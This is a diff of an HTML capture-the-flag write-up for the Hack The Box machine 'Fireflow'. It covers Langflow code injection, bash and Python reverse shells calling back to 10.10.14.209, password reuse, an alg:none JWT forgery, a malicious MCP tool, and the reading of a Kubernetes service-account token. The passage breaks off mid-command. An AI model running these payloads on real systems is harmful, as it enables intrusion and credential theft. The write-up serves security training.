@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fireflow - HTB Report</title>
+    <title>Fireflow - HTB Full Pwn Report</title>
     <link rel="stylesheet" href="../style.css">
     <style>
       :root {
@@ -27,46 +27,44 @@
         line-height: 1.6;
       }
       header {
-        padding: 48px 24px;
+        padding: 52px 24px;
         text-align: center;
-        background: linear-gradient(135deg, #111827 0%, #0f172a 60%, #082f49 100%);
+        background: linear-gradient(135deg, #111827 0%, #0f172a 55%, #082f49 100%);
         border-bottom: 1px solid var(--border);
       }
       header h1 {
         margin: 0;
-        font-size: 2.5rem;
+        font-size: 2.7rem;
         letter-spacing: 1px;
       }
       header p {
         color: var(--muted);
         margin-top: 10px;
+        font-size: 1.05rem;
       }
       main.report {
-        max-width: 1100px;
+        max-width: 1120px;
         margin: 0 auto;
         padding: 32px 20px 64px;
       }
       h2 {
-        margin-top: 42px;
+        margin-top: 44px;
         border-left: 5px solid var(--accent);
         padding-left: 12px;
         color: #f8fafc;
       }
       h3 {
-        margin-top: 28px;
+        margin-top: 30px;
         color: #bae6fd;
       }
       h4 {
         color: #bbf7d0;
+        margin-bottom: 6px;
       }
-      p, li {
-        color: var(--text);
-      }
-      a {
-        color: var(--accent);
-      }
+      p, li { color: var(--text); }
+      a { color: var(--accent); }
       code {
-        background: rgba(2, 6, 23, 0.8);
+        background: rgba(2, 6, 23, 0.85);
         color: #f8fafc;
         padding: 2px 5px;
         border-radius: 4px;
@@ -79,10 +77,7 @@
         overflow-x: auto;
         border: 1px solid var(--border);
       }
-      pre code {
-        background: transparent;
-        padding: 0;
-      }
+      pre code { background: transparent; padding: 0; }
       .card {
         background: var(--panel);
         border: 1px solid var(--border);
@@ -105,6 +100,10 @@
         background: rgba(34, 197, 94, 0.08);
         border-left: 4px solid var(--accent-2);
       }
+      .danger {
+        background: rgba(239, 68, 68, 0.08);
+        border-left: 4px solid var(--danger);
+      }
       .report-table {
         width: 100%;
         border-collapse: collapse;
@@ -124,7 +123,7 @@
       }
       .phase-grid {
         display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
         gap: 14px;
       }
       .badge {
@@ -140,10 +139,18 @@
         color: #fca5a5;
         font-weight: bold;
       }
+      .toc ol {
+        columns: 2;
+        column-gap: 28px;
+      }
       footer {
-        margin-top: 40px;
+        margin-top: 42px;
         color: var(--muted);
         font-size: 0.95rem;
+      }
+      @media (max-width: 720px) {
+        .toc ol { columns: 1; }
+        header h1 { font-size: 2.1rem; }
       }
     </style>
   </head>
@@ -151,7 +158,7 @@
   <body>
     <header>
       <h1>Fireflow</h1>
-      <p>Hack The Box Full Pwn Report | Langflow RCE → Credential Reuse → MCP JWT Abuse → Kubernetes Privilege Escalation</p>
+      <p>Hack The Box Full Pwn Report | Langflow RCE → Credential Reuse → MCP JWT Abuse → Kubernetes nodes/proxy → Root</p>
     </header>
 
     <main class="report">
@@ -165,8 +172,8 @@
             <tr><th>Operating System</th><td>Linux / Ubuntu 24.04.4 LTS</td></tr>
             <tr><th>Target IP</th><td><code>10.129.22.117</code></td></tr>
             <tr><th>Hostnames</th><td><code>fireflow.htb</code>, <code>flow.fireflow.htb</code></td></tr>
-            <tr><th>Status</th><td>In Progress - user obtained, root path identified</td></tr>
             <tr><th>Date Started</th><td>26 June 2026</td></tr>
+            <tr><th>Status</th><td>Completed</td></tr>
           </tbody>
         </table>
       </section>
@@ -174,28 +181,49 @@
       <section>
         <h2>Executive Summary</h2>
         <p>
-          Fireflow exposed an HTTPS web application that led to a public Langflow instance on
-          <code>flow.fireflow.htb</code>. The Langflow instance was vulnerable to an unauthenticated
-          code execution path through the public flow build endpoint. This allowed initial command
-          execution as <code>www-data</code> and a reverse shell on the host.
+          Fireflow exposed an HTTPS landing page that led to a Langflow instance hosted on
+          <code>flow.fireflow.htb</code>. Langflow was vulnerable to unauthenticated code execution
+          through its public temporary flow build endpoint. This provided initial access as
+          <code>www-data</code>.
         </p>
         <p>
-          Post-exploitation enumeration revealed Langflow environment variables containing a
-          superuser password. That password was reused by the local Linux user <code>nightfall</code>,
-          allowing SSH access and retrieval of the user flag. Further enumeration exposed an MCP AI
-          Tool Registry running behind Kubernetes/NodePort. The MCP service disclosed JWT support
-          for the insecure <code>none</code> algorithm, allowing an unsigned JWT to be forged with
-          <code>role=admin</code>. Admin access allowed registration of MCP tools, leading toward RCE
-          inside the MCP pod and a Kubernetes <code>nodes/proxy</code> abuse path to root.
+          Post-exploitation enumeration revealed Langflow superuser credentials in environment
+          variables. The password was reused by the local Linux user <code>nightfall</code>, allowing SSH
+          access and retrieval of the user flag. Further enumeration uncovered an MCP AI Tool
+          Registry running inside Kubernetes. The registry accepted unsigned JWTs using
+          <code>alg:none</code>, allowing an admin token to be forged. Admin access allowed registration
+          of a malicious MCP tool, resulting in code execution inside the MCP pod. The pod's
+          Kubernetes service account had access to <code>nodes/proxy</code>, which was abused to reach the
+          kubelet and execute commands inside a privileged node-exporter pod. Because node-exporter
+          mounted the host filesystem, the root flag was read from the host path.
         </p>
 
-        <div class="phase-grid">
-          <div class="card"><span class="badge">Phase 1</span><h4>Reconnaissance</h4><p>Nmap, vhost discovery, HTTPS enumeration.</p></div>
-          <div class="card"><span class="badge">Phase 2</span><h4>Web Enumeration</h4><p>Langflow discovery, API paths, Gobuster results.</p></div>
-          <div class="card"><span class="badge">Phase 3</span><h4>Initial Access</h4><p>Langflow public flow RCE to <code>www-data</code>.</p></div>
-          <div class="card"><span class="badge">Phase 4</span><h4>Post-Exploitation</h4><p>LinPEAS, leaked environment variables, credential reuse.</p></div>
-          <div class="card"><span class="badge">Phase 5</span><h4>Privilege Escalation</h4><p>MCP JWT <code>alg:none</code> bypass and Kubernetes path.</p></div>
+        <div class="callout success">
+          <strong>Completed attack chain:</strong>
+          <code>HTTPS vhost discovery</code> → <code>Langflow CVE-2026-33017 RCE</code> →
+          <code>www-data</code> → <code>LinPEAS/env credential leak</code> → <code>SSH as nightfall</code> →
+          <code>MCP config disclosure</code> → <code>JWT alg:none admin bypass</code> →
+          <code>MCP pod shell</code> → <code>Kubernetes nodes/proxy</code> → <code>node-exporter host mount</code> →
+          <code>root.txt</code>
         </div>
+      </section>
+
+      <section class="card toc">
+        <h2>Report Structure</h2>
+        <ol>
+          <li>Reconnaissance</li>
+          <li>Web and Service Enumeration</li>
+          <li>Langflow Exploitation</li>
+          <li>Post-Exploitation and Credential Reuse</li>
+          <li>User Access</li>
+          <li>Privilege Escalation Enumeration</li>
+          <li>MCP Registry Discovery</li>
+          <li>JWT Authentication Bypass</li>
+          <li>MCP Pod Code Execution</li>
+          <li>Kubernetes nodes/proxy Abuse</li>
+          <li>Root Flag Retrieval</li>
+          <li>Lessons Learned</li>
+        </ol>
       </section>
 
       <section>
@@ -207,8 +235,8 @@
           <tbody>
             <tr><td>22/tcp</td><td>Open</td><td>SSH</td><td>OpenSSH exposed.</td></tr>
             <tr><td>443/tcp</td><td>Open</td><td>HTTPS</td><td>nginx web server.</td></tr>
-            <tr><td>9100/tcp</td><td>Filtered</td><td>JetDirect / node-exporter candidate</td><td>Later relevant to monitoring/Kubernetes.</td></tr>
-            <tr><td>30000/tcp</td><td>Filtered</td><td>NodePort range</td><td>Possible Kubernetes NodePort exposure.</td></tr>
+            <tr><td>9100/tcp</td><td>Filtered</td><td>JetDirect / node-exporter candidate</td><td>Later relevant because the host uses Prometheus/node-exporter.</td></tr>
+            <tr><td>30000/tcp</td><td>Filtered</td><td>NodePort range</td><td>Suggested possible Kubernetes/NodePort services.</td></tr>
             <tr><td>30718/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
             <tr><td>30951/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
             <tr><td>31038/tcp</td><td>Filtered</td><td>Unknown</td><td>High filtered port.</td></tr>
@@ -218,11 +246,18 @@
 
         <h3>Service Version Scan</h3>
         <pre><code>nmap -sC -sV -p 22,443,9100,30000,30718,30951,31038,31337 10.129.22.117 -oA Nmap/full</code></pre>
-        <p>
-          The HTTPS certificate identified <code>fireflow.htb</code> and wildcard subdomains
-          under <code>*.fireflow.htb</code>. This led to vhost enumeration and the addition of
-          <code>fireflow.htb</code> and <code>flow.fireflow.htb</code> to <code>/etc/hosts</code>.
-        </p>
+        <pre><code>22/tcp   open      ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+443/tcp  open      ssl/http  nginx
+|_http-title: Did not follow redirect to https://fireflow.htb/
+| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
+| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb</code></pre>
+
+        <div class="callout">
+          The certificate subject alternative names revealed both <code>fireflow.htb</code> and
+          <code>*.fireflow.htb</code>, which indicated that virtual host enumeration would be important.
+        </div>
+
+        <h3>Hosts File Setup</h3>
         <pre><code>echo "10.129.22.117 fireflow.htb" | sudo tee -a /etc/hosts
 echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
       </section>
@@ -231,8 +266,8 @@ echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
         <h2>Phase 2: Web and Service Enumeration</h2>
         <h3>HTTPS Certificate Handling</h3>
         <p>
-          Initial <code>curl</code> requests failed because the certificate was self-signed.
-          The <code>-k</code> flag was used to ignore certificate validation during lab testing.
+          Initial <code>curl</code> requests failed because the site used a self-signed certificate.
+          The <code>-k</code> flag was used to ignore certificate validation during testing.
         </p>
         <pre><code>curl -k -I https://fireflow.htb</code></pre>
         <pre><code>HTTP/1.1 200 OK
@@ -241,31 +276,36 @@ X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
 X-Content-Type-Options: nosniff
 Referrer-Policy: strict-origin-when-cross-origin</code></pre>
 
-        <h3>Front-End Discovery</h3>
+        <h3>Main Site Enumeration</h3>
+        <pre><code>whatweb https://fireflow.htb</code></pre>
+        <pre><code>https://fireflow.htb [200 OK] Email[ops@fireflow.htb], HTML5, HTTPServer[nginx], Title[FireFlow — Task Force Nightfall]</code></pre>
         <p>
-          The main page identified the organization as Task Force Nightfall and exposed a public AI
-          playground link on the <code>flow.fireflow.htb</code> subdomain.
-        </p>
-        <table class="report-table">
-          <thead><tr><th>Finding</th><th>Value</th></tr></thead>
-          <tbody>
-            <tr><td>Subdomain</td><td><code>flow.fireflow.htb</code></td></tr>
-            <tr><td>Path</td><td><code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></td></tr>
-            <tr><td>Email</td><td><code>ops@fireflow.htb</code></td></tr>
-            <tr><td>Technology</td><td>Langflow / Flow engine <code>1.8.2</code></td></tr>
-            <tr><td>Feature</td><td>MCP Tool Registry references</td></tr>
-          </tbody>
-        </table>
-
-        <h3>WhatWeb Fingerprinting</h3>
-        <pre><code>whatweb https://fireflow.htb
-whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
-        <p>
-          The <code>flow.fireflow.htb</code> application returned the title <code>Langflow</code>,
-          confirming the exposed AI workflow builder.
+          Reviewing the page source and browser-rendered page identified a link to an AI chat
+          system hosted under <code>flow.fireflow.htb</code> with the path
+          <code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code>.
         </p>
 
         <h3>Directory Enumeration</h3>
+        <pre><code>gobuster dir -u https://fireflow.htb \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -k -x php,html,js,json,txt -t 50</code></pre>
+        <table class="report-table">
+          <thead><tr><th>Path</th><th>Status</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td><code>/index.html</code></td><td>200</td><td>Main landing page.</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Langflow Subdomain</h3>
+        <pre><code>curl -k -I https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
+        <pre><code>HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;</code></pre>
+        <pre><code>whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
+        <pre><code>https://flow.fireflow.htb/... [200 OK] Title[Langflow]</code></pre>
+
+        <h3>Directory Enumeration on flow.fireflow.htb</h3>
         <pre><code>gobuster dir -u https://flow.fireflow.htb \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -k -x php,txt,html,js,json --exclude-length 1142 -t 50</code></pre>
@@ -273,51 +313,59 @@ whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c2
           <thead><tr><th>Path</th><th>Status</th><th>Notes</th></tr></thead>
           <tbody>
             <tr><td><code>/docs</code></td><td>200</td><td>FastAPI Swagger documentation.</td></tr>
-            <tr><td><code>/redoc</code></td><td>200</td><td>ReDoc API documentation.</td></tr>
             <tr><td><code>/health</code></td><td>200</td><td>Application health check.</td></tr>
             <tr><td><code>/logs</code></td><td>403</td><td>Restricted logs endpoint exists.</td></tr>
-            <tr><td><code>/manifest.json</code></td><td>200</td><td>Web application manifest.</td></tr>
+            <tr><td><code>/redoc</code></td><td>200</td><td>ReDoc API documentation.</td></tr>
+            <tr><td><code>/manifest.json</code></td><td>200</td><td>Application manifest.</td></tr>
           </tbody>
         </table>
-        <p>Enumeration of <code>fireflow.htb</code> only revealed <code>/index.html</code>.</p>
+
+        <div class="callout">
+          The Langflow web interface exposed a public playground. Browser developer tools showed
+          traffic to <code>/api/v1/build_public_tmp/&lt;flow_id&gt;/flow</code>, which became the initial
+          exploitation path.
+        </div>
       </section>
 
       <section>
-        <h2>Phase 3: Initial Access - Langflow RCE</h2>
-        <h3>Vulnerability Summary</h3>
+        <h2>Phase 3: Initial Access via Langflow RCE</h2>
+        <h3>Vulnerable Component</h3>
         <p>
-          Langflow <code>1.8.2</code> was vulnerable to an unauthenticated code execution issue in
-          the public temporary flow build endpoint. The application accepted attacker-controlled
-          flow JSON data and executed Python component code during flow construction.
+          The Langflow instance was identified as Flow engine <code>1.8.2</code>. The public playground
+          used a flow build endpoint that accepted client-supplied flow data. By modifying the
+          existing flow JSON and replacing the Python code in the <code>TextOperations</code> component,
+          arbitrary commands could be executed server-side.
         </p>
-        <div class="callout">
-          <strong>Key Endpoint:</strong>
-          <code>/api/v1/build_public_tmp/&lt;flow_id&gt;/flow</code>
-        </div>
 
-        <h3>Manual Exploitation</h3>
+        <table class="report-table">
+          <thead><tr><th>Item</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Flow ID</td><td><code>7d84d636-af65-42e4-ac38-26e867052c25</code></td></tr>
+            <tr><td>Start Component</td><td><code>ChatInput-608En</code></td></tr>
+            <tr><td>Modified Component</td><td><code>TextOperations-yvwhG</code></td></tr>
+            <tr><td>Endpoint</td><td><code>/api/v1/build_public_tmp/&lt;flow_id&gt;/flow</code></td></tr>
+          </tbody>
+        </table>
+
+        <h3>Command Execution Proof</h3>
         <p>
-          The browser request to the public playground was captured and modified. The flow contained
-          a <code>TextOperations-yvwhG</code> node whose Python code was modified so that the
-          final <code>get_message()</code> method executed shell commands using Python.
+          The component method was modified to execute <code>id</code> and return the result in the
+          Langflow output.
         </p>
         <pre><code>def get_message(self) -&gt; Message:
     import os
     return Message(text=os.popen("id").read())</code></pre>
-        <p>The first proof of execution returned:</p>
         <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 
-        <h3>Reverse Shell</h3>
-        <p>
-          A Bash reverse shell was triggered through the modified Langflow component and caught on
-          the attacker machine. This produced a shell as <code>www-data</code> in
-          <code>/var/lib/langflow</code>.
-        </p>
-        <pre><code>nc -lvnp 4444
+        <h3>Reverse Shell as www-data</h3>
+        <p>A reverse shell payload was then executed through the same flow build path.</p>
+        <pre><code># Attacker machine
+nc -lvnp 4444
 
-# Triggered command through Langflow
+# Trigger through modified Langflow request
 bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.209/4444 0&gt;&amp;1"</code></pre>
-        <pre><code>www-data@fireflow:/var/lib/langflow$ whoami
+        <pre><code>Connection received on 10.129.22.117
+www-data@fireflow:/var/lib/langflow$ whoami
 www-data
 www-data@fireflow:/var/lib/langflow$ hostname
 fireflow
@@ -328,21 +376,16 @@ www-data@fireflow:/var/lib/langflow$ pwd
       <section>
         <h2>Phase 4: Post-Exploitation and Credential Reuse</h2>
         <h3>Langflow Files</h3>
-        <p>
-          The Langflow configuration directory contained a database, profile picture directory,
-          project-specific data, and a secret key.
-        </p>
-        <pre><code>ls -la /var/lib/langflow
-ba4fe756-d6f7-4c7a-a7b1-f986206878ec
+        <pre><code>ls -la /var/lib/langflow</code></pre>
+        <pre><code>ba4fe756-d6f7-4c7a-a7b1-f986206878ec
 langflow.db
 profile_pictures
 secret_key</code></pre>
 
-        <h3>LinPEAS / Environment Variables</h3>
+        <h3>LinPEAS and Environment Variables</h3>
         <p>
-          LinPEAS exposed environment variables for the Langflow process. These contained the
-          Langflow superuser account and password. The report redacts the password value, but the
-          original value strongly hinted at the local user <code>nightfall</code>.
+          LinPEAS revealed environment variables for the Langflow process. The key finding was a
+          Langflow superuser password. The value also hinted at the local user <code>nightfall</code>.
         </p>
         <pre><code>LANGFLOW_AUTO_LOGIN=False
 LANGFLOW_CONFIG_DIR=/var/lib/langflow
@@ -350,49 +393,72 @@ LANGFLOW_SECRET_KEY=&lt;redacted&gt;
 LANGFLOW_SUPERUSER=langflow
 LANGFLOW_SUPERUSER_PASSWORD=&lt;redacted&gt;</code></pre>
 
-        <h3>SSH Pivot to nightfall</h3>
-        <p>
-          The Langflow superuser password was reused for the local Linux account
-          <code>nightfall</code>. SSH login succeeded and the user flag was retrieved.
-        </p>
-        <pre><code>ssh nightfall@10.129.22.117
-cat user.txt</code></pre>
-        <pre><code>user.txt: <span class="redacted">REDACTED</span></code></pre>
+        <div class="callout success">
+          The Langflow superuser password was reused for the local Linux user <code>nightfall</code>.
+        </div>
 
-        <h3>Failed Sudo CVE Path</h3>
-        <p>
-          Sudo version <code>1.9.15p5</code> appeared potentially vulnerable to
-          CVE-2025-32463, but exploitation using the tested <code>sudo-chwoot.sh</code> path failed
-          because the user was not permitted to use the <code>-R</code> chroot option.
-        </p>
-        <pre><code>sudo -l
-Sorry, user nightfall may not run sudo on fireflow.
-
-sudo -V
-Sudo version 1.9.15p5
-
-./sudo-chwoot.sh
-sudo: you are not permitted to use the -R option with woot</code></pre>
+        <h3>SSH as nightfall</h3>
+        <pre><code>ssh nightfall@10.129.22.117</code></pre>
+        <pre><code>nightfall@fireflow:~$ whoami
+nightfall
+nightfall@fireflow:~$ ls
+user.txt</code></pre>
       </section>
 
       <section>
-        <h2>Phase 5: MCP AI Tool Registry Enumeration</h2>
-        <h3>Hidden MCP Config</h3>
+        <h2>Phase 5: User Flag</h2>
+        <pre><code>nightfall@fireflow:~$ cat user.txt
+&lt;redacted&gt;</code></pre>
         <p>
-          As <code>nightfall</code>, a hidden MCP configuration file was found in the user's home
-          directory. It contained credentials for a service account named <code>langflow-bot</code>
-          and pointed to an MCP service on port <code>30080</code>.
+          User access was obtained through credential reuse. The public version of this report
+          redacts flag values.
         </p>
-        <pre><code>cat ~/.mcp/config.json
-{
+      </section>
+
+      <section>
+        <h2>Phase 6: Privilege Escalation Enumeration</h2>
+        <h3>Sudo Check</h3>
+        <pre><code>sudo -l</code></pre>
+        <pre><code>Sorry, user nightfall may not run sudo on fireflow.</code></pre>
+
+        <h3>Sudo Version Lead</h3>
+        <pre><code>sudo -V</code></pre>
+        <pre><code>Sudo version 1.9.15p5
+Sudoers policy plugin version 1.9.15p5</code></pre>
+        <p>
+          A sudo chroot vulnerability lead was tested because the installed sudo version appeared
+          to be within a potentially vulnerable range. The attempt failed because the user was not
+          permitted to use the <code>-R</code> option.
+        </p>
+        <pre><code>./sudo-chwoot.sh
+woot!
+[sudo] password for nightfall:
+sudo: you are not permitted to use the -R option with woot</code></pre>
+
+        <h3>Home Directory Enumeration</h3>
+        <pre><code>find ~ -maxdepth 4 -type f -ls 2&gt;/dev/null</code></pre>
+        <pre><code>/home/nightfall/.mcp/config.json
+/home/nightfall/user.txt
+/home/nightfall/.bashrc
+/home/nightfall/.profile</code></pre>
+        <p>
+          The hidden MCP configuration file became the next major lead.
+        </p>
+      </section>
+
+      <section>
+        <h2>Phase 7: MCP AI Tool Registry Discovery</h2>
+        <h3>MCP Configuration</h3>
+        <pre><code>cat ~/.mcp/config.json</code></pre>
+        <pre><code>{
   "server": "http://10.129.22.117:30080",
   "status_endpoint": "/api/v1/version",
   "user": "langflow-bot",
   "password": "&lt;redacted&gt;"
 }</code></pre>
 
-        <h3>MCP Version Endpoint</h3>
-        <pre><code>curl -i -u 'langflow-bot:&lt;redacted&gt;' http://127.0.0.1:30080/api/v1/version</code></pre>
+        <h3>Service Metadata</h3>
+        <pre><code>curl -i -u 'langflow-bot:&lt;password&gt;' http://127.0.0.1:30080/api/v1/version</code></pre>
         <pre><code>{
   "service": "MCP AI Tool Registry",
   "version": "0.1.0",
@@ -411,21 +477,25 @@ sudo: you are not permitted to use the -R option with woot</code></pre>
 }</code></pre>
 
         <h3>Normal Authentication</h3>
-        <p>
-          Authentication with the MCP credentials returned a standard HS256 JWT with
-          <code>role=user</code>.
-        </p>
         <pre><code>curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
   -H 'Content-Type: application/json' \
-  -d '{"username":"langflow-bot","password":"&lt;redacted&gt;"}'</code></pre>
-        <pre><code>{"access_token":"&lt;JWT with role=user&gt;","token_type":"bearer"}</code></pre>
+  -d '{"username":"langflow-bot","password":"&lt;password&gt;"}' | python3 -m json.tool</code></pre>
+        <pre><code>{
+  "access_token": "&lt;HS256 user token redacted&gt;",
+  "token_type": "bearer"
+}</code></pre>
 
-        <h3>JWT none Algorithm Bypass</h3>
         <p>
-          Since the service advertised support for <code>none</code>, an unsigned JWT was forged
-          with <code>role=admin</code>. The admin-only tool registration endpoint returned
-          validation errors instead of <code>401</code> or <code>403</code>, proving authorization was
-          bypassed.
+          Decoding the normal JWT showed the role was only <code>user</code>. However, the version
+          endpoint disclosed that the server also accepted <code>none</code> as a JWT algorithm.
+        </p>
+      </section>
+
+      <section>
+        <h2>Phase 8: JWT alg:none Authentication Bypass</h2>
+        <p>
+          A forged unsigned JWT was created with <code>role=admin</code>. Because the MCP service
+          accepted <code>alg:none</code>, the token was accepted without a valid signature.
         </p>
         <pre><code>ADMIN_TOKEN=$(python3 - &lt;&lt;'PY'
 import base64, json
@@ -440,130 +510,232 @@ payload = {"sub": "langflow-bot", "role": "admin"}
 print(b64url(header) + "." + b64url(payload) + ".")
 PY
 )</code></pre>
+
+        <h3>Admin Endpoint Test</h3>
         <pre><code>curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{}'
+  -d '{}'</code></pre>
+        <pre><code>HTTP/1.1 422 Unprocessable Entity
+{"detail":[{"loc":["body","name"],"msg":"Field required"}, ...]}</code></pre>
+        <p>
+          The <code>422</code> response confirmed that authentication succeeded and the request had
+          reached request-body validation instead of being rejected as unauthorized.
+        </p>
 
-HTTP/1.1 422 Unprocessable Entity
-missing fields: name, description, code</code></pre>
+        <h3>Tool Registration Schema</h3>
+        <pre><code>curl -s http://127.0.0.1:30080/openapi.json | python3 -m json.tool | grep -A60 '"ToolRegisterRequest"'</code></pre>
+        <pre><code>required:
+  - name
+  - description
+  - code</code></pre>
       </section>
 
       <section>
-        <h2>Phase 6: MCP Tool Registration and RCE Path</h2>
-        <h3>Tool Registration Schema</h3>
-        <p>
-          The OpenAPI schema showed that <code>POST /api/v1/tools</code> accepts
-          <code>name</code>, <code>description</code>, optional <code>inputSchema</code>, and
-          <code>code</code>.
-        </p>
-        <pre><code>ToolRegisterRequest:
-  required: name, description, code
-  optional: inputSchema</code></pre>
-
-        <h3>Observed Testing</h3>
-        <p>
-          Initial tools were registered successfully and appeared in <code>tools/list</code>, but
-          tools written as <code>def run()</code> returned blank output and produced no side effects.
-          This matched the external reference: the working payload should place Python directly in
-          the top-level <code>code</code> field and detach the reverse shell using
-          <code>subprocess.Popen</code>.
-        </p>
+        <h2>Phase 9: MCP Tool Registration and Pod Shell</h2>
+        <h3>Tool Enumeration</h3>
         <pre><code>curl -s -X POST http://127.0.0.1:30080/mcp \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","id":20,"method":"tools/list","params":{}}'</code></pre>
+  -d '{"jsonrpc":"2.0","id":20,"method":"tools/list","params":{}}' | python3 -m json.tool</code></pre>
+        <pre><code>ping_host
+get_metrics_summary
+list_running_tasks
+proof
+whoami_check
+write_test2</code></pre>
 
-        <div class="callout success">
-          <strong>Next Exploitation Step:</strong> Register a top-level Python payload that starts a
-          detached reverse shell process, then invoke it through the MCP JSON-RPC endpoint.
-        </div>
-        <pre><code># Attacker box
-nc -lvnp 4444
+        <h3>Failed Custom Function Approach</h3>
+        <p>
+          Initial custom tools used a <code>def run()</code> function and registered successfully, but
+          the MCP call returned blank output and did not produce side effects. This showed that the
+          payload needed to execute as top-level Python code and detach from the HTTP request.
+        </p>
 
-# Target: register detached MCP reverse shell tool
-curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
+        <h3>Working Top-Level Python Reverse Shell</h3>
+        <p>
+          A top-level Python payload was registered using <code>subprocess.Popen</code>. The spawned
+          child process detached from the request handler and connected back to the attacker.
+        </p>
+        <pre><code># Attacker machine
+nc -lvnp 5555</code></pre>
+        <pre><code>curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
-    "name":"pwn2",
-    "description":"detached reverse shell test",
+    "name":"mcp_shell",
+    "description":"MCP reverse shell",
     "inputSchema":{},
-    "code":"import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"10.10.14.209\\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
-  }'
+    "code":"import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"10.10.14.209\\\",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
+  }'</code></pre>
 
-# Target: invoke tool
-curl -s -X POST http://127.0.0.1:30080/mcp \
+        <h3>Triggering the MCP Tool</h3>
+        <pre><code>curl -i -X POST http://127.0.0.1:30080/mcp \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "jsonrpc":"2.0",
-    "id":1,
+    "id":51,
     "method":"tools/call",
-    "params":{"name":"pwn2","arguments":{}}
+    "params":{"name":"mcp_shell","arguments":{}}
   }'</code></pre>
+
+        <pre><code>Connection received on 10.129.22.117
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+mcp@mcp-server-54464cb475-29ztf:/app$</code></pre>
+
+        <h3>Pod Context</h3>
+        <pre><code>mcp@mcp-server-54464cb475-29ztf:/app$ env | grep KUBERNETES
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_SERVICE_PORT=443</code></pre>
+        <pre><code>mcp@mcp-server-54464cb475-29ztf:/app$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+&lt;redacted Kubernetes service account token&gt;</code></pre>
       </section>
 
       <section>
-        <h2>Phase 7: Kubernetes Privilege Escalation Path</h2>
-        <p>
-          The MCP process was observed running as <code>nightfall</code> under
-          <code>uvicorn main:app</code>, while Kubernetes artifacts confirmed a pod named
-          <code>mcp-server</code>. The expected next step is to obtain a shell inside the MCP pod,
-          then read the pod service account token.
-        </p>
-        <pre><code>ps auxww | grep -iE '30080|mcp|uvicorn|python' | grep -v grep
-find / -iname '*mcp*' -o -iname '*registry*' 2&gt;/dev/null | head -100</code></pre>
-        <pre><code>/var/log/containers/mcp-server-54464cb475-29ztf_default_...</code></pre>
+        <h2>Phase 10: Kubernetes Service Account Enumeration</h2>
+        <h3>Service Account Variables</h3>
+        <pre><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+KUBE=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT</code></pre>
 
-        <h3>Service Account Token Checks</h3>
-        <pre><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token
-env | grep KUBERNETES
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</code></pre>
+        <h3>API Server Check</h3>
+        <pre><code>curl -sSk --cacert $CA \
+  -H "Authorization: Bearer $TOKEN" \
+  $KUBE/api</code></pre>
 
-        <h3>RBAC Review</h3>
-        <p>
-          The external writeup indicates the key permission is <code>nodes/proxy</code>. If present,
-          the service account can talk to the kubelet through the API server and execute commands
-          in pods running on the node.
-        </p>
-        <pre><code>curl -sk \
+        <h3>SelfSubjectRulesReview</h3>
+        <pre><code>curl -sSk --cacert $CA \
